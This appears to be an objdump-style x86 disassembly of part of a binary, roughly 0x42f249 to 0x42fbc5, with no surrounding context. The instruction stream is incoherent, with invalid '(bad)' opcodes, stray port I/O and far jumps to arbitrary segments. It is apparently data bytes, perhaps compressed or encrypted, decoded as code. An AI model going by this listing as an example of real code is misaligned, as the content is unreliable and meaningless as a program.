  42f249:	inc    ecx
  42f24a:	push   eax
  42f24b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f24c:	dec    edi
  42f24d:	outs   dx,DWORD PTR ds:[esi]
  42f24e:	pop    ecx
  42f24f:	lods   al,BYTE PTR ds:[esi]
  42f250:	fdivp  st(1),st
  42f252:	mov    eax,0x3584b273
  42f257:	ins    DWORD PTR es:[edi],dx
  42f258:	push   edi
  42f259:	addr16 jp 0x42f2bb
  42f25c:	(bad)  
  42f25d:	stos   BYTE PTR es:[edi],al
  42f25e:	in     eax,0x15
  42f260:	inc    ebx
  42f261:	(bad)  
  42f262:	and    BYTE PTR [edx-0x19],bl
  42f265:	lea    ecx,[eax-0x55]
  42f268:	xlat   BYTE PTR ds:[ebx]
  42f269:	xchg   edx,eax
  42f26a:	sbb    ah,BYTE PTR [ebp-0x4d8bd855]
  42f270:	and    al,0x3f
  42f272:	xchg   ebp,eax
  42f273:	inc    edi
  42f274:	cmc    
  42f275:	int    0x92
  42f277:	dec    edx
  42f278:	fild   WORD PTR [eax+0x4b]
  42f27b:	jmp    0x987e:0x6c4991d7
  42f282:	dec    edi
  42f283:	xchg   esi,eax
  42f284:	jmp    0xd91a9eb9
  42f289:	ja     0x42f2b6
  42f28b:	jne    0x42f305
  42f28d:	sub    BYTE PTR [eax+0x6f84a88b],ch
  42f293:	lea    edi,[edi+0xdf4eb4]
  42f299:	retf   0xfbdf
  42f29c:	mov    ebp,esp
  42f29e:	mov    ds:0xf4867d12,eax
  42f2a3:	stos   BYTE PTR es:[edi],al
  42f2a4:	outs   dx,DWORD PTR ds:[esi]
  42f2a5:	das    
  42f2a6:	lods   al,BYTE PTR ds:[esi]
  42f2a7:	and    al,0xe3
  42f2a9:	jecxz  0x42f2af
  42f2ab:	int    0x72
  42f2ad:	jg     0x42f314
  42f2af:	push   edi
  42f2b0:	inc    eax
  42f2b1:	loopne 0x42f2ec
  42f2b3:	lods   eax,DWORD PTR ds:[esi]
  42f2b4:	xchg   ebx,eax
  42f2b5:	pop    edx
  42f2b6:	test   ebp,esp
  42f2b8:	inc    edi
  42f2b9:	ja     0x42f2d9
  42f2bb:	aaa    
  42f2bc:	mov    edi,0xc3645ff7
  42f2c1:	adc    edi,DWORD PTR [edx-0x6086cb2a]
  42f2c7:	xchg   ch,bh
  42f2c9:	jne    0x42f317
  42f2cb:	in     eax,dx
  42f2cc:	sub    dx,WORD PTR [edi]
  42f2cf:	cmp    BYTE PTR [eax+0x6d],0xab
  42f2d3:	jmp    0x42f2d5
  42f2d5:	jle    0x42f25c
  42f2d7:	imul   esi,DWORD PTR [edx+eiz*8],0xeb7008d0
  42f2de:	xor    ah,BYTE PTR [edx]
  42f2e0:	ret    0x1026
  42f2e3:	add    al,0x26
  42f2e5:	outs   dx,DWORD PTR ds:[esi]
  42f2e6:	add    DWORD PTR [edi-0x5c],esi
  42f2e9:	test   BYTE PTR [eax-0x29],cl
  42f2ec:	adc    al,0x9d
  42f2ee:	mov    bh,0x70
  42f2f0:	adc    eax,0x3001569f
  42f2f5:	jnp    0x42f295
  42f2f7:	add    bl,bh
  42f2f9:	inc    ecx
  42f2fa:	sbb    ch,BYTE PTR ds:0xfc19432e
  42f300:	mov    BYTE PTR [ecx+ebp*1+0x19],al
  42f304:	or     cl,bh
  42f306:	fmul   DWORD PTR ds:0x57a4c32d
  42f30c:	pop    es
  42f30d:	dec    ebx
  42f30e:	sbb    dl,ch
  42f310:	jne    0x42f312
	...
  42f372:	add    BYTE PTR [eax],al
  42f374:	mov    ebp,0xaf8a081a
  42f379:	call   0xcc3a:0x5ac03fbf
  42f380:	fisttp DWORD PTR [esi-0x574bcab]
  42f386:	add    DWORD PTR [eax],eax
  42f388:	add    eax,0x1c000001
  42f38d:	sbb    eax,0xe1b81226
  42f392:	stos   BYTE PTR es:[edi],al
  42f393:	pushf  
  42f394:	adc    eax,0xe2cf6b7e
  42f399:	mov    ebp,0x39847459
  42f39e:	sub    cl,BYTE PTR [edi]
  42f3a0:	or     eax,0x7c824b7
  42f3a5:	ins    DWORD PTR es:[edi],dx
  42f3a6:	aad    0xd6
  42f3a8:	mov    al,ds:0x5587be6a
  42f3ad:	pop    ecx
  42f3ae:	xchg   ecx,eax
  42f3af:	mov    al,ds:0x7aa4343d
  42f3b4:	mov    bl,0x75
  42f3b6:	cwde   
  42f3b7:	pop    ecx
  42f3b8:	sbb    al,0x7a
  42f3ba:	xchg   DWORD PTR [eax-0x5a6ca2a5],edi
  42f3c0:	lock retf 0xceb4
  42f3c4:	test   al,0x8c
  42f3c6:	imul   edx,DWORD PTR [esi-0x6f],0xc
  42f3ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f3cb:	and    edi,esi
  42f3cd:	pop    edx
  42f3ce:	jbe    0x42f3c5
  42f3d0:	pusha  
  42f3d1:	sub    BYTE PTR [ebx-0x7d4b354a],0x83
  42f3d8:	add    eax,ebx
  42f3da:	xlat   BYTE PTR ds:[ebx]
  42f3db:	dec    ecx
  42f3dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f3dd:	jmp    0x42f42a
  42f3df:	lea    esi,[edx-0x24]
  42f3e2:	ja     0x42f3ab
  42f3e4:	push   es
  42f3e5:	loope  0x42f397
  42f3e7:	xor    bl,BYTE PTR [edx]
  42f3e9:	pop    ebx
  42f3ea:	aad    0x10
  42f3ec:	jg     0x42f3ea
  42f3ee:	push   0xffffffa3
  42f3f0:	cmc    
  42f3f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f3f2:	test   BYTE PTR [ebp+0x1601abd6],ah
  42f3f8:	jmp    0x7f17beeb
  42f3fd:	rol    bh,cl
  42f3ff:	pop    ds
  42f400:	(bad)  
  42f401:	int3   
  42f402:	mov    eax,0xec1a8040
  42f407:	push   0x666e1bf5
  42f40c:	add    ebp,ecx
  42f40e:	xor    eax,0xe2f313db
  42f413:	add    BYTE PTR [ebx+0x53c509b6],bh
  42f419:	test   cl,ch
  42f41b:	pop    edi
  42f41c:	bound  ebp,QWORD PTR ds:0x3c7ef09b
  42f422:	fnsave [ecx+0x780efe77]
  42f428:	xchg   BYTE PTR [esp+edi*4-0x3cb7f1a0],cl
  42f42f:	sub    ebx,ebx
  42f431:	dec    ecx
  42f432:	pop    edx
  42f433:	stos   BYTE PTR es:[edi],al
  42f434:	hlt    
  42f435:	jne    0x42f42b
  42f437:	shr    DWORD PTR [esp+ebx*8+0x477b6c9d],cl
  42f43e:	test   al,0x73
  42f440:	sysenter 
  42f442:	push   edi
  42f443:	xchg   esp,eax
  42f444:	and    eax,0x7679076d
  42f449:	adc    eax,0x8aaa35ef
  42f44e:	fnsave [edx]
  42f450:	outs   dx,DWORD PTR ds:[esi]
  42f451:	(bad)  
  42f452:	test   eax,0x82f76774
  42f457:	aam    0xbf
  42f459:	jg     0x42f46e
  42f45b:	ins    DWORD PTR es:[edi],dx
  42f45c:	inc    esp
  42f45d:	xchg   edx,eax
  42f45e:	aas    
  42f45f:	outs   dx,DWORD PTR ds:[esi]
  42f460:	aad    0xa0
  42f462:	mov    DWORD PTR [eax+0x65eef2e2],edi
  42f468:	inc    ecx
  42f469:	cmc    
  42f46a:	dec    edx
  42f46b:	push   edx
  42f46c:	add    ah,BYTE PTR [edx-0x61]
  42f46f:	push   0xffffffbd
  42f471:	nop
  42f472:	and    eax,0x8bdd9d05
  42f477:	jbe    0x42f4d0
  42f479:	inc    edi
  42f47a:	adc    ecx,DWORD PTR [edi]
  42f47c:	sbb    DWORD PTR [edx-0x30],eax
  42f47f:	scas   eax,DWORD PTR es:[edi]
  42f480:	push   0xb226ca16
  42f485:	rcl    BYTE PTR [ecx],1
  42f487:	or     al,0x3f
  42f489:	mov    al,ds:0x622fe8c7
  42f48e:	fdivp  st(0),st
  42f490:	call   0x42f495
	...
  42f4f1:	add    BYTE PTR [eax],al
  42f4f3:	add    BYTE PTR [edi],dh
  42f4f5:	jae    0x42f541
  42f4f7:	cdq    
  42f4f8:	dec    esi
  42f4f9:	mov    ecx,0x13f4fff7
  42f4fe:	jno    0x42f52f
  42f500:	loop   0x42f537
  42f502:	sar    BYTE PTR [edi],0x90
  42f505:	sti    
  42f506:	add    DWORD PTR [eax],eax
  42f508:	add    eax,0xf9000001
  42f50d:	pusha  
  42f50e:	push   ebx
  42f50f:	mov    DWORD PTR ds:0x2541f229,esi
  42f515:	push   0xffffff9c
  42f517:	mov    ecx,0x1de15c60
  42f51c:	bnd jne 0x42f4aa
  42f51f:	push   edx
  42f520:	mov    esp,0x108746e
  42f525:	mov    cl,0xc2
  42f527:	test   eax,0xbb38af1d
  42f52c:	mov    WORD PTR [ebx-0x66],?
  42f52f:	inc    edx
  42f530:	mov    ch,0xfe
  42f532:	add    cl,BYTE PTR [edx]
  42f534:	test   eax,0xc33f602e
  42f539:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f53a:	xor    DWORD PTR ds:0x2dc4d091,ecx
  42f540:	stos   DWORD PTR es:[edi],eax
  42f541:	in     al,0xb3
  42f543:	inc    ebp
  42f544:	not    DWORD PTR [edi-0x65]
  42f547:	xlat   BYTE PTR ds:[ebx]
  42f548:	call   0x1522:0xa8617ab7
  42f54f:	fisubr DWORD PTR [ebx-0x41]
  42f552:	mov    ds:0xb9c03f96,al
  42f557:	cmp    DWORD PTR [esi],ecx
  42f559:	push   ebp
  42f55a:	xchg   esi,eax
  42f55b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f55c:	hlt    
  42f55d:	fnsave [ebp+0x7d]
  42f560:	(bad)  
  42f561:	or     eax,0x7a66b3bb
  42f566:	retf   
  42f567:	lea    edx,[esi]
  42f569:	and    BYTE PTR [edx],cl
  42f56b:	stos   BYTE PTR es:[edi],al
  42f56c:	fldln2 
  42f56e:	adc    eax,0x59ca6f3b
  42f573:	adc    esp,DWORD PTR [esi]
  42f575:	stos   BYTE PTR es:[edi],al
  42f576:	and    DWORD PTR [ebx],esp
  42f578:	mov    cl,BYTE PTR [eax-0x226631be]
  42f57e:	fsubr  DWORD PTR [edi+0x3dbddfc7]
  42f584:	adc    ecx,DWORD PTR [esi]
  42f586:	sahf   
  42f587:	int3   
  42f588:	mov    al,ds:0x4f91c4f9
  42f58d:	push   eax
  42f58e:	adc    DWORD PTR [esi-0xb447651],edx
  42f594:	fisubr DWORD PTR [edi]
  42f596:	loopne 0x42f529
  42f598:	nop
  42f599:	add    eax,0xf45cc078
  42f59e:	mov    esi,0xb66c433d
  42f5a3:	xor    bh,BYTE PTR [edx-0x4a]
  42f5a6:	xchg   edi,eax
  42f5a7:	pop    esp
  42f5a8:	pushf  
  42f5a9:	das    
  42f5aa:	ins    DWORD PTR es:[edi],dx
  42f5ab:	es push esi
  42f5ad:	imul   edx
  42f5af:	pop    ss
  42f5b0:	mov    edi,0x8d317103
  42f5b5:	cmp    ah,BYTE PTR [edi+0x27]
  42f5b8:	or     ebp,DWORD PTR [esi]
  42f5ba:	add    DWORD PTR [ebp-0xc],0x50
  42f5be:	push   eax
  42f5bf:	mov    esi,0x36c6a07
  42f5c4:	rcr    BYTE PTR [ecx+0x29810dff],cl
  42f5ca:	int    0x2d
  42f5cc:	add    DWORD PTR [edi],esp
  42f5ce:	test   DWORD PTR [esi],eax
  42f5d0:	ja     0x42f63a
  42f5d2:	and    BYTE PTR [ebx],dh
  42f5d4:	aaa    
  42f5d5:	outs   dx,DWORD PTR ds:[esi]
  42f5d6:	push   ebx
  42f5d7:	(bad)  
  42f5d9:	aad    0x46
  42f5db:	or     BYTE PTR [ebx-0x2391f501],cl
  42f5e1:	neg    BYTE PTR [ecx+0x2e]
  42f5e4:	mov    esp,?
  42f5e6:	jmp    0xad32:0x53934653
  42f5ed:	mov    ebp,0xde59754
  42f5f2:	jbe    0x42f59e
  42f5f4:	adc    eax,ecx
  42f5f6:	fst    DWORD PTR [esi+0x78]
  42f5f9:	lods   al,BYTE PTR ds:[esi]
  42f5fa:	adc    dl,BYTE PTR ds:0x3096615
  42f600:	pop    esi
  42f601:	inc    ecx
  42f602:	adc    DWORD PTR [esi-0x5c],ebx
  42f605:	xor    ah,BYTE PTR [ebx]
  42f607:	sbb    eax,0x93e72ee6
  42f60c:	add    BYTE PTR [esp+ebx*4],dh
  42f60f:	cdq    
  42f610:	xor    BYTE PTR [eax],al
	...
  42f672:	add    BYTE PTR [eax],al
  42f674:	ds push esi
  42f676:	into   
  42f677:	nop
  42f678:	out    dx,al
  42f679:	cwde   
  42f67a:	jle    0x42f67a
  42f67c:	push   eax
  42f67d:	sub    edx,esi
  42f67f:	dec    esp
  42f680:	(bad)  
  42f681:	imul   ebp,DWORD PTR [ebp+0x1fc95b9],0x10500
  42f68b:	add    BYTE PTR [ecx-0x7f112ed7],bl
  42f691:	(bad)  
  42f692:	sbb    DWORD PTR [eax],esi
  42f694:	sbb    eax,0x6e2a6124
  42f699:	add    DWORD PTR [ebp+0x4e94e2af],edx
  42f69f:	cmp    ebp,DWORD PTR [edi+0x6a]
  42f6a2:	cmp    edx,DWORD PTR [ecx-0x34897dbf]
  42f6a8:	cwde   
  42f6a9:	jle    0x42f64b
  42f6ab:	mov    edx,0xa6f1184
  42f6b0:	loopne 0x42f67e
  42f6b2:	ds adc al,0x94
  42f6b5:	rcl    BYTE PTR [ecx+0x7f],0x3
  42f6b9:	dec    ebp
  42f6ba:	push   esp
  42f6bb:	lahf   
  42f6bc:	mov    ds:0xf0c0297c,eax
  42f6c1:	mov    al,0x2a
  42f6c3:	inc    ebp
  42f6c4:	push   0x3f
  42f6c6:	or     BYTE PTR [ebx],ah
  42f6c8:	mov    bh,0xe2
  42f6ca:	mov    bl,BYTE PTR [eax]
  42f6cc:	adc    al,0x29
  42f6ce:	das    
  42f6cf:	gs jp  0x42f731
  42f6d2:	ss rol ch,0x4b
  42f6d6:	and    ah,dh
  42f6d8:	fcom   QWORD PTR [edi+0x2]
  42f6db:	in     eax,0xdb
  42f6dd:	popa   
  42f6de:	(bad)  
  42f6df:	pop    ss
  42f6e0:	pop    ss
  42f6e1:	jecxz  0x42f733
  42f6e3:	jle    0x42f67f
  42f6e5:	mov    dh,0x4c
  42f6e7:	(bad)  
  42f6e8:	mov    al,ds:0x583d53e7
  42f6ed:	mov    edx,0x205b4f95
  42f6f2:	dec    ebx
  42f6f3:	or     ebp,DWORD PTR [esi-0x3f]
  42f6f6:	push   edx
  42f6f7:	sahf   
  42f6f8:	nop
  42f6f9:	loope  0x42f681
  42f6fb:	ret    
  42f6fc:	push   ss
  42f6fd:	and    eax,0xab7b8ff0
  42f702:	add    esi,eax
  42f704:	dec    ebx
  42f705:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f706:	sbb    DWORD PTR fs:[esi+esi*1],esp
  42f70a:	jno    0x42f745
  42f70c:	rol    BYTE PTR [esp+ecx*2],1
  42f70f:	jl     0x42f77a
  42f711:	enter  0xadc9,0x5
  42f715:	add    al,0x54
  42f717:	and    ch,dl
  42f719:	mov    gs,WORD PTR [eax+0x6d]
  42f71c:	jbe    0x42f768
  42f71e:	sbb    ecx,0xdb5da7be
  42f724:	jmp    0x42f768
  42f726:	and    cl,ah
  42f728:	push   ebx
  42f729:	fild   DWORD PTR [ecx+0x34f9fbc1]
  42f72f:	imul   ebx,ecx,0x70cf22c6
  42f735:	les    esi,FWORD PTR [eax]
  42f737:	neg    DWORD PTR [ebx]
  42f739:	jecxz  0x42f705
  42f73b:	xor    al,0x76
  42f73d:	jbe    0x42f748
  42f73f:	out    0x93,eax
  42f741:	dec    eax
  42f742:	pop    esi
  42f743:	inc    ebx
  42f744:	(bad)  
  42f745:	jmp    0xf234:0x58853131
  42f74c:	dec    esi
  42f74d:	call   0x65e4:0xb04c6b8
  42f754:	mov    edx,DWORD PTR [ebp-0x469c338b]
  42f75a:	jbe    0x42f7a8
  42f75c:	xchg   esi,eax
  42f75d:	into   
  42f75e:	sub    cl,BYTE PTR ds:0xf6efe3ba
  42f764:	pop    es
  42f765:	pop    ebp
  42f766:	adc    BYTE PTR [eax+0x32515c35],0xce
  42f76d:	adc    esi,DWORD PTR [eax]
  42f76f:	inc    ebp
  42f770:	stos   BYTE PTR es:[edi],al
  42f771:	loopne 0x42f7ce
  42f773:	push   edi
  42f774:	jmp    0x42f765
  42f776:	jl     0x42f724
  42f778:	mov    WORD PTR [ebx+0x63],ds
  42f77b:	retf   0xe276
  42f77e:	out    dx,al
  42f77f:	das    
  42f780:	dec    ecx
  42f781:	pop    edi
  42f782:	loop   0x42f780
  42f784:	loop   0x42f72d
  42f786:	dec    ecx
  42f787:	shl    DWORD PTR [ebx],cl
  42f789:	xchg   edx,eax
  42f78a:	inc    eax
  42f78b:	adc    al,BYTE PTR [ecx-0x32fe4d06]
	...
  42f7f1:	add    BYTE PTR [eax],al
  42f7f3:	add    BYTE PTR [ecx-0x5f],dh
  42f7f6:	(bad)  
  42f7f7:	test   al,0xd6
  42f7f9:	(bad)  
  42f7fa:	jg     0x42f7f5
  42f7fc:	push   cs
  42f7fd:	pop    ebp
  42f7fe:	push   ebp
  42f7ff:	mov    edi,0xdd287d9e
  42f804:	call   0x1:0x50001fd
  42f80b:	add    BYTE PTR [esi+eiz*8-0x1a],ch
  42f80f:	imul   si,WORD PTR [edx],0xffd4
  42f813:	cld    
  42f814:	(bad)  
  42f815:	(bad)  
  42f816:	sub    al,BYTE PTR [edx+eiz*1-0x78]
  42f81a:	fisub  DWORD PTR gs:[ebp+esi*2+0x7b]
  42f81f:	aas    
  42f820:	repnz aam 0xdf
  42f823:	iret   
  42f824:	fbld   TBYTE PTR [eax-0x2f4361cb]
  42f82a:	adc    DWORD PTR [eax-0x10],esp
  42f82d:	test   BYTE PTR [edi],bl
  42f82f:	cmp    al,0xaa
  42f831:	dec    ecx
  42f832:	nop
  42f833:	addr16 out 0x2a,al
  42f836:	and    al,0x37
  42f838:	hlt    
  42f839:	fwait
  42f83a:	dec    ecx
  42f83b:	lods   al,BYTE PTR ds:[esi]
  42f83c:	(bad)  
  42f83d:	fsubr  QWORD PTR [ebp-0x27ac05b7]
  42f843:	mov    bh,0x32
  42f845:	jmp    0xab85:0x5ba6bfed
  42f84c:	mov    ch,0x3c
  42f84e:	push   edi
  42f84f:	arpl   WORD PTR [edx-0x614f351a],di
  42f855:	sub    edi,DWORD PTR [ebx-0x3b1e3022]
  42f85b:	jnp    0x42f819
  42f85d:	dec    esi
  42f85e:	pop    ss
  42f85f:	cdq    
  42f860:	aas    
  42f861:	push   eax
  42f862:	dec    edx
  42f863:	pop    ds
  42f864:	adc    BYTE PTR [edx-0x5b],cl
  42f867:	fsubp  st(0),st
  42f869:	mov    al,ds:0xd745acd3
  42f86e:	adc    ch,BYTE PTR [ebx+0x6a007234]
  42f874:	sbb    eax,0x76725853
  42f879:	mov    bl,al
  42f87b:	jecxz  0x42f8d8
  42f87d:	sti    
  42f87e:	cdq    
  42f87f:	pop    esp
  42f880:	aam    0xa0
  42f882:	jmp    0xc7c7373b
  42f887:	pop    es
  42f888:	retf   0xf2af
  42f88b:	nop
  42f88c:	dec    ebp
  42f88d:	test   BYTE PTR [ecx+0x910bc4],bl
  42f893:	mov    eax,ds:0xa0dc3ea7
  42f898:	lods   al,BYTE PTR ds:[esi]
  42f899:	inc    edi
  42f89a:	test   al,0x78
  42f89c:	xor    DWORD PTR [esp+esi*8+0x32809d3b],edx
  42f8a3:	repz popa 
  42f8a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f8a6:	dec    edi
  42f8a7:	pop    ebx
  42f8a8:	jno    0x42f891
  42f8aa:	pop    ss
  42f8ab:	push   esp
  42f8ac:	or     al,0xe2
  42f8ae:	gs mov ebp,0xe781bd55
  42f8b4:	mov    al,ds:0xc6f1bacc
  42f8b9:	sbb    eax,0x4b0accbe
  42f8be:	lahf   
  42f8bf:	sahf   
  42f8c0:	and    esi,0xf
  42f8c3:	pop    esi
  42f8c4:	mov    bl,0x3
  42f8c6:	ins    BYTE PTR es:[edi],dx
  42f8c7:	les    edx,FWORD PTR [esp-0xfd8309f]
  42f8ce:	loopne 0x42f8c7
  42f8d0:	xor    DWORD PTR [edx],ebp
  42f8d2:	fwait
  42f8d3:	cmp    ecx,DWORD PTR [ebp-0x7caf01ac]
  42f8d9:	in     eax,0xf8
  42f8db:	push   ss
  42f8dc:	sub    ah,BYTE PTR [esi]
  42f8de:	inc    ecx
  42f8df:	xor    ebp,0xffffff88
  42f8e2:	inc    eax
  42f8e3:	bound  eax,QWORD PTR [edx]
  42f8e5:	sub    BYTE PTR [eax+0x46],bh
  42f8e8:	sub    ecx,DWORD PTR [ebp+0x78a1128e]
  42f8ee:	mov    ebp,0xffe0ae88
  42f8f3:	mov    ah,0xc3
  42f8f5:	xchg   esi,eax
  42f8f6:	bound  edx,QWORD PTR [esi+0x3db5ff71]
  42f8fc:	xchg   ebx,eax
  42f8fd:	jg     0x42f97a
  42f8ff:	pop    ecx
  42f900:	mov    ebx,0xb0a0c8a7
  42f905:	xchg   BYTE PTR [ecx],cl
  42f907:	clc    
  42f908:	fistp  DWORD PTR [ebx+ebp*1]
  42f90b:	jns    0x42f8a8
  42f90d:	inc    esp
  42f90e:	into   
  42f90f:	in     eax,dx
  42f910:	adc    BYTE PTR [eax],al
	...
  42f972:	add    BYTE PTR [eax],al
  42f974:	adc    al,0x74
  42f976:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f977:	push   ebp
  42f978:	in     al,0xd5
  42f97a:	cmc    
  42f97b:	jne    0x42f928
  42f97d:	sbb    cl,dh
  42f97f:	js     0x42f946
  42f981:	fimul  DWORD PTR [esi+esi*8+0x1fe9f]
  42f988:	add    eax,0xe2000001
  42f98d:	cwde   
  42f98e:	imul   ebp,DWORD PTR [edx+0x512c63e1],0x44
  42f995:	stos   BYTE PTR es:[edi],al
  42f996:	imul   ebx,DWORD PTR [esi+0x7c1524f2],0xffffffdb
  42f99d:	sbb    eax,0x7509b090
  42f9a2:	inc    edx
  42f9a3:	push   ecx
  42f9a4:	xchg   esp,eax
  42f9a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f9a6:	ror    bl,0xa0
  42f9a9:	or     al,0xdd
  42f9ab:	mov    esp,0xa2f73192
  42f9b0:	lods   al,BYTE PTR ds:[esi]
  42f9b1:	push   ecx
  42f9b2:	outs   dx,DWORD PTR ds:[esi]
  42f9b3:	mov    dh,BYTE PTR [edi]
  42f9b5:	test   al,0x6b
  42f9b7:	and    eax,0xf5623db1
  42f9bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f9bd:	test   BYTE PTR [ecx+0x3e],0x99
  42f9c1:	div    eax
  42f9c3:	js     0x42f996
  42f9c5:	mov    ebx,0x2a88db45
  42f9ca:	xor    al,BYTE PTR [esi+eax*8+0x779a9d01]
  42f9d1:	xchg   esi,eax
  42f9d2:	xor    DWORD PTR [ebx-0x201ddc9e],0x5d875905
  42f9dc:	call   0xa451ca74
  42f9e1:	into   
  42f9e2:	cmp    edx,DWORD PTR [ebp-0x5ec3c85b]
  42f9e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f9e9:	pop    esi
  42f9ea:	int3   
  42f9eb:	ret    0x167d
  42f9ee:	mov    ah,0xc5
  42f9f0:	imul   ebx,ebx,0xfffffff1
  42f9f3:	test   eax,0x6cfb1140
  42f9f8:	mov    ch,0x6e
  42f9fa:	fwait
  42f9fb:	sbb    eax,0xe925558
  42fa00:	dec    edx
  42fa01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fa02:	fsubr  QWORD PTR [esi-0x33]
  42fa05:	mov    dh,0x62
  42fa07:	cli    
  42fa08:	mov    gs,edx
  42fa0a:	and    BYTE PTR [ebp+0x69],0x95
  42fa0e:	xor    BYTE PTR [ebx],cl
  42fa10:	fsubr  QWORD PTR [esp+esi*1]
  42fa13:	push   cs
  42fa14:	mov    edi,0x4e318635
  42fa19:	test   DWORD PTR [edx+0x66be239e],ebx
  42fa1f:	pop    eax
  42fa20:	in     al,0x72
  42fa22:	std    
  42fa23:	call   0x7290:0x81b7ff77
  42fa2a:	push   ebp
  42fa2b:	hlt    
  42fa2c:	sti    
  42fa2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fa2e:	jb     0x42f9dd
  42fa30:	fdivr  DWORD PTR [eax+0x66]
  42fa33:	xchg   ebx,eax
  42fa34:	push   edi
  42fa35:	out    0x56,al
  42fa37:	sub    dh,ah
  42fa39:	xor    BYTE PTR [ecx+0x6af50eb8],0x6
  42fa40:	or     ecx,DWORD PTR [ebp+0x61]
  42fa43:	and    eax,0xc2f584e3
  42fa48:	sub    al,0x45
  42fa4a:	pop    esi
  42fa4b:	push   eax
  42fa4c:	xchg   esp,eax
  42fa4d:	in     eax,0x74
  42fa4f:	fiadd  WORD PTR [edi]
  42fa51:	xchg   ebx,eax
  42fa52:	xchg   ebp,eax
  42fa53:	sbb    DWORD PTR [ebx],ebx
  42fa55:	repnz scas al,BYTE PTR es:[edi]
  42fa57:	rol    DWORD PTR [ecx],cl
  42fa59:	outs   dx,DWORD PTR ds:[esi]
  42fa5a:	mov    dl,0x95
  42fa5c:	dec    eax
  42fa5d:	sbb    eax,0x12a451c8
  42fa62:	scas   eax,DWORD PTR es:[edi]
  42fa63:	out    dx,al
  42fa64:	mov    al,BYTE PTR [edx]
  42fa66:	jmp    DWORD PTR [edx-0x68]
  42fa69:	mov    edi,esp
  42fa6b:	pop    ebx
  42fa6c:	add    al,0x2b
  42fa6e:	jecxz  0x42fae2
  42fa70:	dec    ebx
  42fa71:	outs   dx,BYTE PTR ds:[esi]
  42fa72:	and    BYTE PTR [eax-0x8],dh
  42fa75:	cmp    eax,0x9eb946ed
  42fa7a:	mov    esp,0x6604c93b
  42fa7f:	stos   BYTE PTR es:[edi],al
  42fa80:	sti    
  42fa81:	inc    eax
  42fa82:	iret   
  42fa83:	xor    ebp,DWORD PTR [edi]
  42fa85:	pop    ebx
  42fa86:	pop    ebx
  42fa87:	icebp  
  42fa88:	xchg   DWORD PTR [edi],esi
  42fa8a:	xor    al,0x99
  42fa8c:	iret   
  42fa8d:	lahf   
  42fa8e:	retf   0xcf0f
	...
  42faf1:	add    BYTE PTR [eax],al
  42faf3:	add    BYTE PTR [ebx],bl
  42faf5:	out    dx,eax
  42faf6:	shl    BYTE PTR [esi],0xf4
  42faf9:	aas    
  42fafa:	(bad)  
  42fafb:	out    dx,eax
  42fafc:	int3   
  42fafd:	mov    WORD PTR [edi+0x32],?
  42fb00:	xchg   edi,eax
  42fb01:	xchg   ebx,eax
  42fb02:	ja     0x42fb30
  42fb04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fb05:	inc    DWORD PTR [ecx]
  42fb07:	add    BYTE PTR ds:0x3c000001,al
  42fb0d:	push   0xffffffa8
  42fb0f:	sti    
  42fb10:	sub    al,0x25
  42fb12:	jo     0x42fb0d
  42fb14:	pop    ecx
  42fb15:	or     al,0xff
  42fb17:	push   ecx
  42fb18:	push   es
  42fb19:	setp   ah
  42fb1c:	std    
  42fb1d:	pop    edi
  42fb1e:	test   DWORD PTR [eax],0x462a29c8
  42fb24:	sbb    BYTE PTR gs:[edi+ebp*8+0x43b53e07],0xa6
  42fb2d:	aaa    
  42fb2e:	xchg   esi,eax
  42fb2f:	push   ebx
  42fb30:	add    ch,ah
  42fb32:	not    cl
  42fb34:	not    DWORD PTR [edi-0x7b9da997]
  42fb3a:	cmc    
  42fb3b:	mov    bl,0xc5
  42fb3d:	or     eax,0xfbe7168e
  42fb42:	test   BYTE PTR ds:0x10254818,dl
  42fb48:	xchg   DWORD PTR [edi+0x50f7f296],ebx
  42fb4e:	mov    esi,0x4b239a39
  42fb53:	(bad)  
  42fb54:	in     eax,dx
  42fb55:	je     0x42fb24
  42fb57:	ficomp WORD PTR [edx-0x349c53ab]
  42fb5d:	mov    ebp,esi
  42fb5f:	jp     0x42fbd1
  42fb61:	dec    esi
  42fb62:	sub    esp,DWORD PTR [ecx]
  42fb64:	outs   dx,BYTE PTR ds:[esi]
  42fb65:	and    al,0x3
  42fb67:	add    DWORD PTR [eax-0x497ad0a4],eax
  42fb6d:	aaa    
  42fb6e:	mov    bl,0x65
  42fb70:	jp     0x42fbb5
  42fb72:	repnz or BYTE PTR ss:[edi-0x79329164],ch
  42fb7a:	sub    DWORD PTR ds:0xa9ed28a1,esi
  42fb80:	jge    0x42fbc0
  42fb82:	gs das 
  42fb84:	jb     0x42fb8d
  42fb86:	xor    BYTE PTR [edi-0x297ef46e],ch
  42fb8c:	fld    TBYTE PTR [edx+eax*4]
  42fb8f:	push   edx
  42fb90:	mov    ebp,0x1737be1
  42fb95:	(bad)
  42fb99:	jnp    0x42fba8
  42fb9b:	and    al,0xe8
  42fb9d:	test   DWORD PTR [edx],eax
  42fb9f:	mov    esi,0xab9e9ba4
  42fba4:	ja     0x42fb8f
  42fba6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fba7:	in     al,0x92
  42fba9:	into   
  42fbaa:	(bad)  
  42fbab:	sbb    ah,bh
  42fbad:	jne    0x42fb2f
  42fbaf:	outs   dx,DWORD PTR ds:[esi]
  42fbb0:	and    eax,0xcfb330cd
  42fbb5:	xchg   edx,eax
  42fbb6:	out    dx,eax
  42fbb7:	div    BYTE PTR [ebx]
  42fbb9:	inc    eax
  42fbba:	xchg   esi,eax
  42fbbb:	fwait
  42fbbc:	dec    ecx
  42fbbd:	xor    edi,0xc3efb4df
  42fbc3:	jl     0x42fb4d
  42fbc5:	fiadd  WORD PTR [esi+0x32]
